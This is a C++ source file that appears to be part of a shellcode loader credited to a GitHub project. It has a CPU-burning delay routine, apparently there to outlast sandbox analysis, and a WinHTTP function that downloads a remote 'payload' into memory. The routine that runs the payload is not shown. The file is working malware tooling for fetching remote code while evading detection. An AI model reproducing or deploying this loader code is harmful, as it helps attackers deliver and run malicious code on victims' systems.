#include "shellcode_downloader.h"
#include <winhttp.h>
#include <stdio.h>
#include <math.h>
#include <iostream>
#pragma comment(lib, "winhttp.lib")

// from https://github.com/1K0ng/C_Sep_Loader

// Delay execution
void delay_execution() {
    for (int i = 2; i <= 2000000; ++i) {
        int isPrime = 1;
        for (int j = 2; j <= sqrt(i); ++j) {
            if (i % j == 0) {
                isPrime = 0;
                break;
            }
        }
    }
}

// Download payload from remote server using WinHTTP
unsigned char* download_payload(const wchar_t* url, size_t* payload_size) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    unsigned char* payload = NULL;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;

    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t hostName[256];
    wchar_t urlPath[256];

    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) {
        fprintf(stderr, "WinHttpCrackUrl failed\n");
        return NULL;
    }

    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen failed\n");
        return NULL;
    }

    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect failed\n");
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest failed\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        fprintf(stderr, "WinHttpSendRequest failed\n");
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        fprintf(stderr, "WinHttpReceiveResponse failed\n");
    }

    if (bResults) {
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                fprintf(stderr, "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            if (dwSize == 0) {
                break;
            }

            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                fprintf(stderr, "Out of memory\n");
                dwSize = 0;
                break;
            }
            else {
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                    fprintf(stderr, "Error %u in WinHttpReadData.\n", GetLastError());
                    free(pszOutBuffer);
                    break;
                }
                else {
                    unsigned char* temp_payload = (unsigned char*)realloc(payload, *payload_size + dwDownloaded);
                    if (temp_payload == NULL) {
                        fprintf(stderr, "Memory allocation failed\n");
                        free(pszOutBuffer);
                        if (payload) free(payload);
                        return NULL;
                    }
                    payload = temp_payload;
                    memcpy(payload + *payload_size, pszOutBuffer, dwDownloaded);
                    *payload_size += dwDownloaded;
                }
                free(pszOutBuffer);
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (*payload_size == 0 && payload) {
        free(payload);
        payload = NULL;
    }

    return payload;
}
